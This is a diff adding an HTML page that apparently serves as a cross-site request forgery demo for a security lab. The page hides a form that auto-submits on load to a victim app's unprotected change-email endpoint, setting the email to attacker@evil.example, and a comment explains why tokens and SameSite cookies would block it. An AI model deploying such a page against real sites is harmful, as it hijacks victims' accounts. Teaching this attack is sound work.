@@ -1,0 +1,23 @@
+<!doctype html>
+<title>Totally Legit Cats 🐈</title>
+<style>
+  body { font-family: system-ui, sans-serif; max-width: 30rem; margin: 4rem auto; color:#444; }
+  .muted { color:#888; font-size:.85rem; }
+</style>
+
+<h1>🐈 Totally Legit Cats</h1>
+<p>Enjoy these cats! (Nothing suspicious happening here…)</p>
+
+<!-- This page pretends to be on a DIFFERENT origin (evil.example). It
+     auto-submits a hidden cross-site POST to the victim app's UNPROTECTED
+     endpoint. The victim's browser attaches their session cookie, so the
+     request is authenticated — classic CSRF. The PROTECTED endpoint would
+     reject this (no CSRF token), and a SameSite cookie would stop the cookie
+     being sent at all. -->
+<form id="attack" method="post" action="{{ target }}/vuln/change-email">
+  <input type="hidden" name="email" value="attacker@evil.example">
+</form>
+<script>document.getElementById('attack').submit();</script>
+
+<p class="muted">If you were logged in, your account email was just changed to
+<code>attacker@evil.example</code> via the unprotected endpoint.</p>
